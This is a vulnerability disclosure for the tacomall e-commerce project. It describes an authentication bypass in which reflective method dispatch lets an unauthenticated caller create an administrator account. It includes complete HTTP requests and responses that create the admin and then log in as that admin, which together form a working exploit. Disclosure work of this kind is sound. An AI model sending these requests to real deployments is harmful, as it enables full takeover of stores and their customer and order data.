# tacomall — Unauthenticated Reflective Method Dispatch Creates Administrator

## Introduction

The `api/ma` application excludes Shiro entirely (`ApiMaApplication.java:7-10`) yet still component-scans `com.tacomall.common`. `MainController` maps `POST /{domain}/{action}` with `@SimpleRestController`, and `SimpleRestControllerAspect` reflectively invokes the `getBean(domain+"ServiceImpl")` method — **a token is only verified when the target method carries `@SimpleRestLogin`** (`SimpleRestControllerAspect.java:61-78`); every other method runs with no authentication. `OrgStaffServiceImpl.add(JSONObject)` (`:154-163`) has no such annotation and binds the full JSON (including `isAdmin`/`jobId`) via `JSON.toJavaObject`, then inserts the row. The `api-admin` backend has zero authorization checks project-wide ⇒ an unauthenticated attacker creates an administrator = full-platform superadmin.

## Affected versions

All current (master; Spring Boot 3.2 / Java 17)

## Utilize conditions

- `api/ma` is externally reachable (by design in this architecture); no account / token / captcha required

---

## Vulnerability Reproduction

**Step 1** — unauthenticated request (no Authorization):

```http
POST /orgStaff/add HTTP/1.1
Host: 127.0.0.1:4002
Content-Type: application/json
Content-Length: 105

{"username":"test821","nickname":"pwned","passwd":"test@123","deptId":1,"jobId":1,"isAdmin":1,"status":1}
```

![image-20260821095918499](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821095918499.1vzduxw7ts.webp)

Response :

```json
{"status":true,"code":2000,"message":"正确响应","data":{"id":3,"deptId":1,"jobId":1,"isAdmin":1,"username":"test821","nickname":"pwned","passwd":"8622f0f69c91819119a8acf60a248d7b36fdb7ccf857ba8f85cf7f2767ff8265","status":1,"isDelete":null,"createTime":null,"updateTime":null,"deleteTime":null}}
```

**Step 2** — log in as the created admin on `api-admin` (4001), backend has 0 authz checks:

```http
POST /org/staffLogin?username=test821&passwd=test@123 HTTP/1.1
Host: 127.0.0.1:4001
Content-Type: application/x-www-form-urlencoded
```

Response :

```json
{"status":true,"code":2000,"message":"正确响应","data":"2eb71414-0205-4218-ab31-79a0c3f248a5"}
```

![image-20260821100533181](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821100533181.5trrbm7xsc.webp)

The returned `data` is the Shiro session — with project-wide zero authorization checks, `test821` is superadmin over members/orders/products/logistics.

code:

![image-20260821101021108](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821101021108.3k8qs4nkbv.webp)

![image-20260821101054863](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821101054863.64el4rnyh2.webp)

![image-20260821101145998](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821101145998.64el4rob3t.webp)

![image-20260821101225795](https://github.com/fangtang7/picx-images-hosting/raw/master/tacomall/image-20260821101225795.9gxaz556qv.webp)
